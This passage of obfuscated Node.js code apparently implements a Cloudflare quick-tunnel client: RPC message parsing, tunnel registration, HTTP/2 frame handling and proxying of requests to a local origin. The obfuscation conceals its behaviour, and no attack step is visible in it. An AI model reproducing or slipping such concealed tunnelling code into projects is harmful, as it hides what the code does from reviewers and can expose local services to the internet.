            'BCWLF': function (j, k) {
                return j >= k;
            },
            'brySf': fW(0xc3a),
            'ryhJt': function (j, k) {
                return j !== k;
            },
            'uqihc': function (j, k) {
                return j & k;
            },
            'ySvmo': function (j, k) {
                return j & k;
            },
            'EerEx': function (j, k) {
                return j & k;
            },
            'oRHFK': function (j, k) {
                return j + k;
            },
            'DRoUm': function (j, k) {
                return j(k);
            },
            'sazOu': function (j, k) {
                return j >> k;
            },
            'mifgW': function (j, k) {
                return j >> k;
            },
            'mpldM': function (j, k) {
                return j > k;
            }
        };
    if (c['BCWLF'](b, a[fW(0xed)]))
        throw new Error(c[fW(0x553)]);
    const d = a[b];
    if (c[fW(0xd3a)](c[fW(0xa78)](d, 0x3n), 0x0n))
        throw new Error(fW(0x6a8));
    let f = c[fW(0x112)](d >> 0x2n, 0x3fffffffn);
    c[fW(0x7ac)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[fW(0x674)](b, 0x1) + c[fW(0x7cb)](Number, f), h = Number(c[fW(0xa78)](c[fW(0x6c0)](d, 0x20n), 0xffffn)), i = Number(c[fW(0xb12)](d, 0x30n) & 0xffffn);
    if (g < 0x0 || c[fW(0x8e6)](c[fW(0x674)](c[fW(0x674)](g, h), i), a[fW(0xed)]))
        throw new Error(c[fW(0x553)]);
    return [
        g,
        h,
        i
    ];
}
function a0aG(a) {
    const fX = a0ch, b = {
            'TQtyf': function (d, f) {
                return d <= f;
            },
            'FCKSP': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[fX(0xbfb)](b[fX(0x963)](d, 0x8), a[fX(0xed)]); d += 0x8) {
        c['push'](a[fX(0x6cb)](d));
    }
    return c;
}
function a0aH(a, b) {
    const fY = a0ch, c = {
            'VFnak': function (p, q) {
                return p >= q;
            },
            'yjHlj': function (p, q) {
                return p !== q;
            },
            'YUXfg': function (p, q) {
                return p & q;
            },
            'BeXbD': function (p, q) {
                return p >> q;
            },
            'KZdZs': function (p, q) {
                return p + q;
            },
            'CifUi': function (p, q) {
                return p(q);
            },
            'qHMlk': function (p, q) {
                return p < q;
            },
            'TJdoF': function (p, q) {
                return p >= q;
            },
            'pULXC': function (p, q) {
                return p !== q;
            },
            'lUMHX': function (p, q) {
                return p(q);
            },
            'HIUfq': function (p, q) {
                return p >> q;
            },
            'tlSri': function (p, q) {
                return p + q;
            },
            'XCaxf': function (p, q) {
                return p === q;
            },
            'pDcUi': function (p, q) {
                return p !== q;
            },
            'FTCdY': function (p, q) {
                return p * q;
            },
            'IPDFH': function (p, q) {
                return p * q;
            },
            'PocLo': function (p, q, r) {
                return p(q, r);
            },
            'FslKe': function (p, q, r) {
                return p(q, r);
            }
        };
    if (c[fY(0x300)](b, a['length']))
        return null;
    const d = a[b];
    if (c[fY(0x801)](d & 0x3n, 0x1n) || c[fY(0x801)](c['YUXfg'](d >> 0x20n, 0x7n), 0x7n))
        return null;
    let f = c['YUXfg'](c[fY(0x405)](d, 0x2n), 0x3fffffffn);
    c[fY(0xc1d)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[fY(0xd2b)](b, 0x1) + c[fY(0xa90)](Number, f), h = c[fY(0xa90)](Number, c[fY(0x405)](d, 0x23n));
    if (c[fY(0x44a)](g, 0x0) || c[fY(0xc25)](g, a['length']))
        return null;
    const j = a[g];
    if (c[fY(0x8bc)](c[fY(0xc1d)](j, 0x3n), 0x0n))
        return null;
    const k = Number(c[fY(0x405)](j, 0x20n) & 0xffffn), l = Number(c[fY(0xc1d)](c['BeXbD'](j, 0x30n), 0xffffn)), m = c[fY(0x117)](Number, c[fY(0x484)](j, 0x2n) & 0x3fffffffn), n = c[fY(0x536)](k, l);
    if (l < 0x2 || c[fY(0x687)](n, 0x0) || c[fY(0xa38)](c[fY(0x41e)](n, m), h))
        return null;
    if (c[fY(0x536)](g, 0x1) + c[fY(0x41e)](n, m) > a[fY(0xed)])
        return null;
    const o = [];
    for (let p = 0x0; p < m; p++) {
        const q = c[fY(0xd2b)](g, 0x1) + c['IPDFH'](p, n);
        o[fY(0x77f)]([
            c['PocLo'](a0aI, a, c[fY(0x536)](q, k)),
            c[fY(0x544)](a0aI, a, c[fY(0x536)](q + k, 0x1))
        ]);
    }
    return o;
}
function a0aI(a, b) {
    const fZ = a0ch, c = {
            'pQBdh': function (m, n) {
                return m >= n;
            },
            'jrMFd': function (m, n) {
                return m & n;
            },
            'IlfTP': function (m, n) {
                return m & n;
            },
            'yhPFp': function (m, n) {
                return m >> n;
            },
            'YmjMB': function (m, n) {
                return m + n;
            },
            'ireKt': function (m, n) {
                return m(n);
            },
            'wLbjm': function (m, n) {
                return m & n;
            },
            'zfQrN': function (m, n) {
                return m >> n;
            },
            'aDGgd': function (m, n) {
                return m >> n;
            },
            'xBSoR': function (m, n) {
                return m / n;
            },
            'jKxzR': function (m, n) {
                return m < n;
            },
            'qwvLv': function (m, n) {
                return m > n;
            },
            'cdYKM': function (m, n) {
                return m * n;
            },
            'ApzKN': function (m, n) {
                return m & n;
            },
            'wpXzz': function (m, n) {
                return m * n;
            },
            'LwfuP': 'utf8'
        };
    if (c[fZ(0xcf3)](b, a[fZ(0xed)]))
        return '';
    const d = a[b];
    if (c[fZ(0xc0e)](d, 0x3n) !== 0x1n)
        return '';
    let f = c[fZ(0x2f4)](c[fZ(0x5bc)](d, 0x2n), 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c['YmjMB'](c[fZ(0x7ad)](b, 0x1), c[fZ(0xb2b)](Number, f)), h = Number(c['wLbjm'](c[fZ(0x642)](d, 0x20n), 0x7n)), j = Number(c['aDGgd'](d, 0x23n)), k = Math[fZ(0x3cd)](c[fZ(0x5ef)](j, 0x8));
    if (h !== 0x2 || c['jKxzR'](g, 0x0) || c[fZ(0x931)](c[fZ(0x7ad)](g, k), a[fZ(0xed)]))
        return '';
    const l = Buffer[fZ(0x9e7)](c[fZ(0x8a2)](k, 0x8));
    for (let m = 0x0; c[fZ(0x976)](m, k); m++) {
        l[fZ(0xa8f)](c[fZ(0xccf)](a[c['YmjMB'](g, m)], 0xffffffffffffffffn), c[fZ(0x15e)](m, 0x8));
    }
    return l[fZ(0x4b4)](0x0, j)['toString'](c[fZ(0x8ac)])[fZ(0xa6e)](/\0+$/, '');
}
function a0aJ(a) {
    const g0 = a0ch, b = {
            'MrzzK': function (u, v) {
                return u % v;
            },
            'zWAAO': function (u, v) {
                return u(v);
            },
            'AUNpC': function (u, v, w) {
                return u(v, w);
            },
            'GZBMe': function (u, v) {
                return u < v;
            },
            'iitEJ': function (u, v) {
                return u !== v;
            },
            'nnMme': function (u, v) {
                return u & v;
            },
            'XlyGX': function (u, v) {
                return u + v;
            },
            'LxZMA': function (u, v) {
                return u(v);
            },
            'nRBzA': function (u, v) {
                return u >> v;
            },
            'AKkzU': function (u, v) {
                return u === v;
            },
            'nHyIB': function (u, v) {
                return u + v;
            },
            'bKwEJ': function (u, v) {
                return u + v;
            },
            'BsVOo': g0(0xbdb),
            'JtLSh': function (u, v) {
                return u === v;
            },
            'wpfRQ': function (u, v) {
                return u + v;
            },
            'DGFtZ': function (u, v) {
                return u & v;
            },
            'UMOqP': g0(0x597)
        };
    if (b[g0(0x1d0)](a['length'], 0x8) || a['length'] < 0x10)
        throw new Error(g0(0x9dc));
    const c = b[g0(0x652)](a0aG, a);
    let d, f, g;
    [d, f, g] = b[g0(0x80a)](a0aF, c, 0x0);
    if (b[g0(0x260)](f, 0x1) || b[g0(0x473)](b[g0(0x685)](c[d], 0xffffn), 0x3n))
        throw new Error('not\x20an\x20RPC\x20return\x20message');
    const [h, i, j] = b['AUNpC'](a0aF, c, b[g0(0x3ea)](d, f)), k = b[g0(0x343)](Number, b[g0(0x457)](c[h], 0x30n) & 0xffffn);
    if (b[g0(0xcce)](k, 0x4)) {
        const [u, v] = b[g0(0x80a)](a0aF, c, b[g0(0x189)](h, i));
        return {
            'ok': ![],
            'error': a0aI(c, b['XlyGX'](u, v)) || 'unknown\x20error'
        };
    }
    if (b[g0(0x473)](k, 0x0))
        return {
            'ok': ![],
            'error': b['nHyIB'](g0(0x4ba), k)
        };
    const [l, m, n] = b[g0(0x80a)](a0aF, c, b[g0(0x3a2)](h, i));
    if (!n)
        return {
            'ok': ![],
            'error': b['BsVOo']
        };
    const o = c[l + m];
    if (b['JtLSh'](b[g0(0x685)](o, 0x3n), 0x3n))
        return {
            'ok': ![],
            'bootstrap': !![]
        };
    let p, q, r;
    [p, q, r] = b[g0(0x80a)](a0aF, c, l + m);
    b[g0(0xcce)](q, 0x0) && r === 0x1 && ([p, q, r] = b[g0(0x80a)](a0aF, c, b[g0(0x7bb)](p, q)));
    const s = q > 0x0 ? b[g0(0x652)](Number, b[g0(0xd15)](c[p], 0xffffn)) : 0x0;
    if (s === 0x1) {
        const [w, x] = b[g0(0x80a)](a0aF, c, p + q), y = b[g0(0x80a)](a0aI, c, b['bKwEJ'](b[g0(0x189)](w, x), 0x1));
        return {
            'ok': !![],
            'location': y
        };
    }
    const t = b[g0(0x80a)](a0aI, c, p + q);
    return {
        'ok': ![],
        'error': t || b['UMOqP']
    };
}
function a0aK(a) {
    const g1 = a0ch, b = {
            'mkmKm': function (h, i) {
                return h(i);
            },
            'tYMbk': function (h, i, j) {
                return h(i, j);
            },
            'OUYCN': function (h, i) {
                return h < i;
            },
            'ayxoR': function (h, i) {
                return h < i;
            },
            'umELR': g1(0xb6d),
            'zaFdM': function (h, i) {
                return h + i;
            },
            'hxelj': function (h, i) {
                return h + i;
            }
        }, c = b['mkmKm'](a0aG, a);
    if (!c['length'])
        throw new Error(g1(0x1e4));
    let d, f, g;
    [d, f, g] = b[g1(0x49c)](a0aF, c, 0x0);
    if (b[g1(0x4d8)](f, 0x1) || b[g1(0x254)](g, 0x2))
        throw new Error(b['umELR']);
    return {
        'dest': b[g1(0x49c)](a0aI, c, b[g1(0xbf5)](d, f)),
        'type': Number(c[d] & 0xffffn),
        'metadata': a0aH(c, b['hxelj'](d, f) + 0x1) || []
    };
}
function a0aL(a, b) {
    const g2 = a0ch, c = {
            'zjAJD': function (h, i) {
                return h + i;
            },
            'qVlXI': function (h, i) {
                return h + i;
            }
        }, d = new a0aB(), f = d[g2(0x9e7)](0x1), g = d[g2(0x9e7)](0x2);
    return d[g2(0x943)](f, g, 0x0, 0x2), d[g2(0xd50)](g, a || '', !![]), d[g2(0x527)](c[g2(0x6f9)](g, 0x1), b[g2(0xed)], 0x0, 0x2, (h, i) => {
        const g3 = g2;
        d[g3(0xd50)](i, b[h][0x0], !![]), d[g3(0xd50)](c[g3(0x6c9)](i, 0x1), b[h][0x1], !![]);
    }), d[g2(0xb9b)]();
}
const a0aM = {
    '.js': a0ch(0xb39),
    '.mjs': 'text/javascript;\x20charset=utf-8',
    '.css': a0ch(0xa4a),
    '.json': 'application/json;\x20charset=utf-8',
    '.map': a0ch(0x154),
    '.wasm': a0ch(0x897),
    '.html': a0ch(0x1c1),
    '.htm': 'text/html;\x20charset=utf-8',
    '.svg': a0ch(0xa4b),
    '.xml': a0ch(0xd56),
    '.woff': 'font/woff2',
    '.woff2': a0ch(0x814),
    '.png': a0ch(0x666),
    '.jpg': a0ch(0x2e7),
    '.jpeg': 'image/jpeg',
    '.gif': a0ch(0xf5),
    '.ico': 'image/x-icon'
};
function a0aN(a) {
    const g4 = a0ch, b = {
            'fASPu': function (f, g) {
                return f < g;
            }
        }, c = a[g4(0x5d7)]('/') ? a[g4(0x88a)](0x0, -0x1) : a, d = c['lastIndexOf']('.');
    if (b[g4(0xf6)](d, 0x0))
        return '';
    return a0aM[c[g4(0x88a)](d)['toLowerCase']()] || '';
}
function a0aO(a) {
    const g5 = a0ch, b = {
            'NShWb': function (c, d) {
                return c !== d;
            },
            'dVnks': g5(0x9be),
            'VfrUh': function (c, d) {
                return c + d;
            },
            'cToqp': function (c, d) {
                return c % d;
            },
            'FirCZ': g5(0xd18)
        };
    if (Array[g5(0x595)](a))
        return Buffer['from'](a);
    if (b[g5(0x585)](typeof a, b[g5(0xa70)]))
        throw new Error(g5(0xcae));
    return Buffer[g5(0x8c2)](b[g5(0x1c2)](a, '='[g5(0x79e)](b[g5(0x940)](-a[g5(0xed)], 0x4))), b[g5(0x199)]);
}
const a0aP = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0aQ(a) {
    const g6 = a0ch, b = {
            'cfKSy': function (c, d) {
                return c(d);
            },
            'hAgrK': function (c, d) {
                return c + d;
            },
            'LfAxv': function (c, d) {
                return c + d;
            },
            'AOFTS': g6(0x465),
            'eNgaR': g6(0xc74),
            'tduMO': g6(0x9be),
            'zKIGm': 'bad\x20account\x20tag\x20or\x20hostname',
            'CmJig': g6(0x26f),
            'hwvwH': g6(0x5d3),
            'cbCWN': 'data',
            'ktsOX': g6(0xb4f),
            'rZPRt': g6(0x712),
            'fomWn': function (c, d) {
                return c + d;
            },
            'qSFSQ': 'requesting\x20quick\x20tunnel\x20failed:\x20',
            'OAVlC': function (c, d) {
                return c === d;
            },
            'bCLXY': g6(0x604),
            'YeaeH': g6(0xb76),
            'NJpKW': g6(0x899)
        };
    return new Promise((c, d) => {
        const g7 = g6;
        let f;
        try {
            f = new URL(a['replace'](/\/+$/, '') + b[g7(0x233)]);
        } catch (i) {
            b[g7(0xb71)](d, new Error(b['fomWn'](b[g7(0x9e1)], i[g7(0x8f9)])));
            return;
        }
        const g = b[g7(0x5e2)](f[g7(0x711)], b[g7(0x140)]) ? a0h : a0g, h = g['request'](f, {
                'method': b['YeaeH'],
                'headers': {
                    'Content-Type': b[g7(0x45e)],
                    'User-Agent': g7(0x21f)
                },
                'timeout': 0x3a98
            }, j => {
                const gb = g7, k = {
                        'kRbfz': function (m, n) {
                            const g8 = a0b;
                            return b[g8(0xb71)](m, n);
                        },
                        'LYjac': function (m, n) {
                            const g9 = a0b;
                            return b[g9(0xbe7)](m, n);
                        },
                        'XMdFI': function (m, n) {
                            const ga = a0b;
                            return b[ga(0x9c6)](m, n);
                        },
                        'jNtig': 'quick\x20tunnel\x20returned\x20non-JSON\x20(',
                        'RNSds': b[gb(0xb4b)],
                        'jwBvH': b[gb(0xb78)],
                        'lgvyQ': gb(0x2c2),
                        'lCiuW': function (m, n) {
                            return m !== n;
                        },
                        'OLfhP': b[gb(0xaa2)],
                        'hlggn': b[gb(0x45d)],
                        'IhvCc': b[gb(0x8e1)],
                        'EubHU': b[gb(0x5da)]
                    }, l = [];
                j['on'](b['cbCWN'], m => l[gb(0x77f)](m)), j['on'](b['ktsOX'], d), j['on'](gb(0xa40), () => {
                    const gc = gb, m = Buffer['concat'](l), n = j[gc(0xca6)];
                    let o;
                    try {
                        o = JSON[gc(0x418)](m[gc(0x1d9)](gc(0xc74)));
                    } catch (q) {
                        k[gc(0x449)](d, new Error(k[gc(0x872)](k[gc(0x64d)](k[gc(0x1a0)], n) + k[gc(0x452)], m['subarray'](0x0, 0x12c)[gc(0x1d9)](k[gc(0x698)]))));
                        return;
                    }
                    const p = o[gc(0x2e5)] || {};
                    if (!(o[gc(0xa61)] ?? !![]) || !p) {
                        k[gc(0x449)](d, new Error(gc(0xb2f) + JSON['stringify'](o[gc(0x1bd)])));
                        return;
                    }
                    try {
                        const r = k[gc(0x449)](String, p['id']);
                        if (!a0aP[gc(0x8d7)](r))
                            throw new Error(k[gc(0xcf6)]);
                        if (k[gc(0x885)](typeof p['account_tag'], 'string') || k[gc(0x885)](typeof p[gc(0xa56)], k['OLfhP']))
                            throw new Error(k[gc(0xa22)]);
                        const s = a0aO(p[gc(0x2cd)]), t = Buffer[gc(0x8c2)](r[gc(0xa6e)](/-/g, ''), k[gc(0xcfa)]);
                        k[gc(0x449)](c, [
                            p['hostname'],
                            p[gc(0x30e)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        d(new Error(k[gc(0x64d)](k[gc(0x90f)], u[gc(0x8f9)])));
                    }
                });
            });
        h['on'](b[g7(0x11c)], j => d(new Error(g7(0xb4a) + j[g7(0x8f9)]))), h[g7(0xa40)]();
    });
}
function a0aR(a) {
    const gd = a0ch;
    return a[gd(0x51f)](([b, c]) => Buffer[gd(0x8c2)](b, gd(0xc74))[gd(0x1d9)]('base64')[gd(0xa6e)](/=+$/, '') + ':' + Buffer[gd(0x8c2)](c, gd(0xc74))['toString'](gd(0xd18))[gd(0xa6e)](/=+$/, ''))[gd(0xaa7)](';');
}
class a0aS {
    constructor(a) {
        const ge = a0ch, b = {
                'nmzAQ': ge(0x7bf),
                'imDGr': 'end',
                'UAPnH': 'data',
                'ozqCd': 'error'
            }, c = b[ge(0x1fc)][ge(0xbb0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[ge(0x316)] = [];
                continue;
            case '1':
                a['on'](b['imDGr'], () => {
                    const gf = ge;
                    this['closed'] = !![], this[gf(0xd24)]();
                });
                continue;
            case '2':
                this[ge(0xb6f)] = a;
                continue;
            case '3':
                a['on'](b[ge(0xb38)], f => {
                    const gg = ge;
                    this[gg(0xc5e)] = this[gg(0xc5e)][gg(0xed)] ? Buffer[gg(0x653)]([
                        this[gg(0xc5e)],
                        f
                    ]) : f, this['_drain']();
                });
                continue;
            case '4':
                this[ge(0x49a)] = null;
                continue;
            case '5':
                a['on'](b[ge(0x53e)], f => {
                    const gh = ge;
                    this[gh(0x49a)] = f, this['_drain']();
                });
                continue;
            case '6':
                a['on'](ge(0x4f7), () => {
                    this['closed'] = !![], this['_drain']();
                });
                continue;
            case '7':
                this[ge(0xb41)] = ![];
                continue;
            case '8':
                this[ge(0xc5e)] = Buffer[ge(0x9e7)](0x0);
                continue;
            }
            break;
        }
    }
    ['_drain']() {
        const gi = a0ch, a = {
                'vgErq': function (b, c) {
                    return b > c;
                },
                'yVnMT': function (b, c) {
                    return b >= c;
                },
                'yRTIS': function (b, c) {
                    return b !== c;
                },
                'jDLwp': 'connection\x20closed'
            };
        while (a[gi(0x9af)](this[gi(0x316)][gi(0xed)], 0x0)) {
            const b = this['waiters'][0x0];
            if (a[gi(0x49d)](this[gi(0xc5e)][gi(0xed)], b[gi(0x9ba)])) {
                this['waiters']['shift']();
                const c = this[gi(0xc5e)][gi(0x4b4)](0x0, b[gi(0x9ba)]);
                this[gi(0xc5e)] = this[gi(0xc5e)]['subarray'](b['need']), b['resolve'](c);
            } else {
                if (a['yRTIS'](this[gi(0x49a)], null))
                    this[gi(0x316)][gi(0xaa5)](), b['reject'](this[gi(0x49a)]);
                else {
                    if (this[gi(0xb41)])
                        this[gi(0x316)][gi(0xaa5)](), b[gi(0x1e0)](new Error(a[gi(0x725)]));
                    else
                        break;
                }
            }
        }
    }
    [a0ch(0x9d5)](a) {
        const gj = a0ch, b = {
                'enUdp': function (c, d) {
                    return c !== d;
                },
                'hdRMH': function (c, d) {
                    return c >= d;
                },
                'YJtNy': 'connection\x20closed'
            };
        if (b['enUdp'](this[gj(0x49a)], null))
            return Promise[gj(0x1e0)](this['errored']);
        if (b['hdRMH'](this[gj(0xc5e)][gj(0xed)], a)) {
            const c = this[gj(0xc5e)][gj(0x4b4)](0x0, a);
            return this['buffer'] = this[gj(0xc5e)]['subarray'](a), Promise[gj(0x6ad)](c);
        }
        if (this[gj(0xb41)])
            return Promise[gj(0x1e0)](new Error(b[gj(0xc56)]));
        return new Promise((d, f) => {
            const gk = gj;
            this[gk(0x316)][gk(0x77f)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[gk(0xd24)]();
        });
    }
}
class a0aT {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const gl = a0ch, l = gl(0x15b)['split']('|');
        let m = 0x0;
        while (!![]) {
            switch (l[m++]) {
            case '0':
                this[gl(0xc73)] = 0xffff;
                continue;
            case '1':
                this[gl(0x8b3)] = d;
                continue;
            case '2':
                this[gl(0x215)] = h;
                continue;
            case '3':
                this[gl(0x2e2)] = c;
                continue;
            case '4':
                this['registrationFailed'] = ![];
                continue;
            case '5':
                this[gl(0x355)] = null;
                continue;
            case '6':
                this[gl(0x43a)] = j;
                continue;
            case '7':
                this['origin'] = b;
                continue;
            case '8':
                this[gl(0x6c8)] = g;
                continue;
            case '9':
                this[gl(0x942)] = f;
                continue;
            case '10':
                this['stopped'] = ![];
                continue;
            case '11':
                this[gl(0x123)] = [];
                continue;
            case '12':
                this['streams'] = new Map();
                continue;
            case '13':
                this[gl(0x91a)] = new a0aS(a);
                continue;
            case '14':
                this[gl(0x7d5)] = k || { 'printed': ![] };
                continue;
            case '15':
                this[gl(0x25e)] = a0ao;
                continue;
            case '16':
                this[gl(0x8f6)] = i;
                continue;
            case '17':
                this[gl(0x6d2)] = new Map();
                continue;
            case '18':
                this[gl(0xba5)] = a;
                continue;
            case '19':
                this[gl(0x6e7)] = new a0ax();
                continue;
            case '20':
                this['registered'] = ![];
                continue;
            }
            break;
        }
    }
    [a0ch(0xa3b)](a, b, c, d = Buffer['alloc'](0x0)) {
        const gm = a0ch, f = {
                'MRPrm': function (h, i) {
                    return h > i;
                },
                'MTmzD': gm(0x933),
                'aCaPh': function (h, i) {
                    return h & i;
                }
            };
        if (f['MRPrm'](d['length'], 0xffffff))
            throw new Error(f[gm(0x64e)]);
        const g = Buffer[gm(0x9e7)](0x9);
        g[gm(0x96b)](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[gm(0x295)](f[gm(0x8a3)](c, 0x7fffffff), 0x5), this[gm(0xba5)]['write'](Buffer['concat']([
            g,
            d
        ]));
    }
    ['sendHeaders'](a, b, c = ![]) {
        const d = {
                'DzVWK': function (h, i) {
                    return h | i;
                }
            }, f = a0aA(b), g = d['DzVWK'](0x4, c ? 0x1 : 0x0);
        this['sendFrame'](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const gn = a0ch, b = {
                'BOwkT': function (c, d) {
                    return c > d;
                },
                'hMWOU': function (c, d) {
                    return c > d;
                }
            };
        if (b[gn(0x6d1)](this['connectionWindow'], 0x0) && b[gn(0xd29)](this['streamWindows']['get'](a) ?? 0xffff, 0x0))
            return Promise[gn(0x6ad)]();
        return new Promise(c => {
            const go = gn;
            this['windowWaiters'][go(0x77f)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    ['_notifyWindows']() {
        const gp = a0ch, a = {
                'ibyUI': function (c, d) {
                    return c > d;
                },
                'zapfs': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[gp(0x123)]) {
            const d = this['streamWindows'][gp(0x850)](c[gp(0x73e)]) ?? 0xffff;
            a[gp(0x55c)](this[gp(0xc73)], 0x0) && a[gp(0x3ba)](d, 0x0) ? c[gp(0x6ad)]() : b[gp(0x77f)](c);
        }
        this[gp(0x123)] = b;
    }
    [a0ch(0x5f9)]() {
        const gq = a0ch;
        for (const a of this[gq(0x123)]) {
            a[gq(0x6ad)]();
        }
        this[gq(0x123)] = [];
    }
    async [a0ch(0x2c9)](a, b, c = ![]) {
        const gr = a0ch, d = {
                'DNVHC': function (h, i) {
                    return h + i;
                },
                'iuGeL': function (h, i) {
                    return h - i;
                }
            }, f = b[gr(0xed)];
        let g = 0x0;
        do {
            await this[gr(0x5fb)](a);
            if (this[gr(0x727)])
                return;
            const h = this[gr(0x6d2)][gr(0x850)](a) ?? 0xffff, i = Math[gr(0x2dc)](f - g, this[gr(0xc73)], h, this[gr(0x25e)]), j = c && d[gr(0x2bd)](g, i) >= f ? 0x1 : 0x0, k = b[gr(0x4b4)](g, g + i);
            this['connectionWindow'] -= i, this['streamWindows'][gr(0xb80)](a, d[gr(0x5a6)](h, i)), this[gr(0xa3b)](0x0, j, a, k), g += i;
        } while (g < f);
    }
    [a0ch(0x70f)](a, b) {
        const gs = a0ch;
        if (b > 0x0) {
            const c = Buffer[gs(0x9e7)](0x4);
            c[gs(0x295)](b & 0x7fffffff, 0x0), this[gs(0xa3b)](0x8, 0x0, a, c);
        }
    }
    async ['readFrame']() {
        const gt = a0ch, a = {
                'KxUTH': function (i, j) {
                    return i & j;
                }
            }, b = await this['reader'][gt(0x9d5)](0x9), c = b[gt(0x21d)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[gt(0x78f)](b[gt(0x236)](0x5), 0x7fffffff), h = await this[gt(0x91a)]['readExact'](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async ['readHeaders'](a, b, c) {
        const gu = a0ch, d = {
                'GFTjd': function (g, h) {
                    return g & h;
                },
                'kkUlj': function (g, h) {
                    return g - h;
                },
                'oFbGJ': function (g, h) {
                    return g !== h;
                },
                'xubBw': function (g, h) {
                    return g !== h;
                }
            };
        if (d['GFTjd'](a, 0x8)) {
            const g = c[0x0];
            c = c[gu(0x4b4)](0x1);
            if (g > c[gu(0xed)])
                throw new Error(gu(0x344));
            c = g ? c[gu(0x4b4)](0x0, d[gu(0xa0f)](c['length'], g)) : c;
        }
        a & 0x20 && (c = c[gu(0x4b4)](0x5));
        const f = [c];
        while (!d[gu(0x1ef)](a, 0x4)) {
            const h = await this[gu(0x30d)]();
            if (d[gu(0x3f6)](h[0x0], 0x9) || d[gu(0x48c)](h[0x2], b))
                throw new Error('expected\x20CONTINUATION\x20frame');
            f[gu(0x77f)](h[0x3]), a = h[0x1];
        }
        return this['decoder'][gu(0x7be)](Buffer[gu(0x653)](f));
    }
    [a0ch(0x212)](a) {
        const gv = a0ch, b = {
                'AhZNe': function (c, d) {
                    return c !== d;
                },
                'xCJxr': gv(0x7f2)
            };
        if (b[gv(0x495)](this[gv(0x355)], null))
            return;
        this[gv(0x355)] = new a0aV(this, a, this[gv(0x215)]), this['sendHeaders'](a, [[
                gv(0xa7c),
                b[gv(0xd3f)]
            ]]), this['control'][gv(0xd0b)](this[gv(0x2e2)], this['tunnelSecret'], this[gv(0x942)], this['connIndex']);
    }
    [a0ch(0x613)](a, b) {
        const gw = a0ch, c = {
                'QQDhR': function (g, h, i) {
                    return g(h, i);
                },
                'calgu': gw(0xa7c),
                'YRKAE': gw(0x7f2),
                'ixiEi': 'content-type',
                'fawio': gw(0x899),
                'ZSSye': 'content-length',
                'qVDqK': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON['parse'](b[gw(0xed)] ? b[gw(0x1d9)](gw(0xc74)) : '{}'), h = c[gw(0x3ae)](parseInt, g[gw(0xa8d)], 0xa);
            !Number['isNaN'](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[gw(0x8c2)](JSON[gw(0x70a)]({ 'latestAppliedVersion': d }));
        this[gw(0x9cc)](a, [
            [
                c[gw(0xa4f)],
                c['YRKAE']
            ],
            [
                c[gw(0x16f)],
                c['fawio']
            ],
            [
                c['ZSSye'],
                c[gw(0x4bb)](String, f[gw(0xed)])
            ]
        ]), this['sendData'](a, f, !![]);
    }
    [a0ch(0xb9d)](a, b) {
        const gx = a0ch, c = {
                'yGMIv': gx(0x43e),
                'XuPwx': function (g, h) {
                    return g === h;
                },
                'jcjYB': gx(0xd41)
            }, d = c['yGMIv']['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (b[gx(0x5df)])
                    return;
                continue;
            case '1':
                if (c[gx(0x98f)](b[gx(0x96e)], c['jcjYB'])) {
                    this[gx(0x613)](a, Buffer['concat'](b['body']));
                    return;
                }
                continue;
            case '2':
                this[gx(0x768)](a, b)['catch'](() => {
                });
                continue;
            case '3':
                b[gx(0x5df)] = !![];
                continue;
            case '4':
                if (b[gx(0xcfe)])
                    return;
                continue;
            }
            break;
        }
    }
    async ['proxyRequest'](a, b) {
        const gy = a0ch, c = {
                'ciLwt': function (d, f) {
                    return d === f;
                },
                'dBtQk': gy(0x153),
                'FWGAT': 'cf-cloudflared-',
                'iSuMe': 'connection',
                'JNsEA': function (d, f) {
                    return d(f);
                },
                'LhHTv': gy(0x890),
                'ECuUA': gy(0xa7c),
                'OesNz': function (d, f) {
                    return d(f);
                },
                'WNOXG': 'cf-cloudflared-response-headers',
                'vwctA': function (d, f) {
                    return d + f;
                },
                'fdcIf': '502'
            };
        try {
            const d = await a0aY(this['origin'], b[gy(0x5bd)], b['path'], b[gy(0x363)], Buffer[gy(0x653)](b[gy(0xae4)])), f = [], g = [];
            for (const [k, l] of d['headers']) {
                const m = k[gy(0xacd)]();
                c[gy(0xc9f)](m, gy(0x36e)) && g[gy(0x77f)]([
                    m,
                    l
                ]);
                const n = m[gy(0xc9b)](c[gy(0x2c5)]) || m[gy(0xc9b)](c[gy(0x38e)]) || m[gy(0xc9b)](gy(0xd5f)) || m[gy(0xc9b)](':');
                (!n || c[gy(0xc9f)](m, c[gy(0x5c4)]) || c[gy(0xc9f)](m, gy(0x96e)) || m === gy(0x244)) && f[gy(0x77f)]([
                    m,
                    l
                ]);
            }
            if (!f[gy(0xb7b)](([o]) => o === gy(0x890))) {
                const o = c[gy(0x5f4)](a0aN, b['path']);
                o && f[gy(0x77f)]([
                    c[gy(0x28b)],
                    o
                ]);
            }
            const h = c['JNsEA'](a0aR, f), i = d[gy(0x4dc)] === 0x65 ? 0xc8 : d[gy(0x4dc)], j = [
                    [
                        c[gy(0xc87)],
                        c[gy(0xa71)](String, i)
                    ],
                    ...g,
                    [
                        c[gy(0xb3f)],
                        h
                    ],
                    [
                        gy(0x108),
                        '{\x22src\x22:\x22origin\x22,\x22flow_rate_limited\x22:false}'
                    ]
                ];
            this[gy(0x9cc)](a, j);
            for await (const p of d[gy(0xae4)]) {
                await this[gy(0x2c9)](a, p, ![]);
            }
            await this[gy(0x2c9)](a, Buffer[gy(0x9e7)](0x0), !![]);
        } catch (q) {
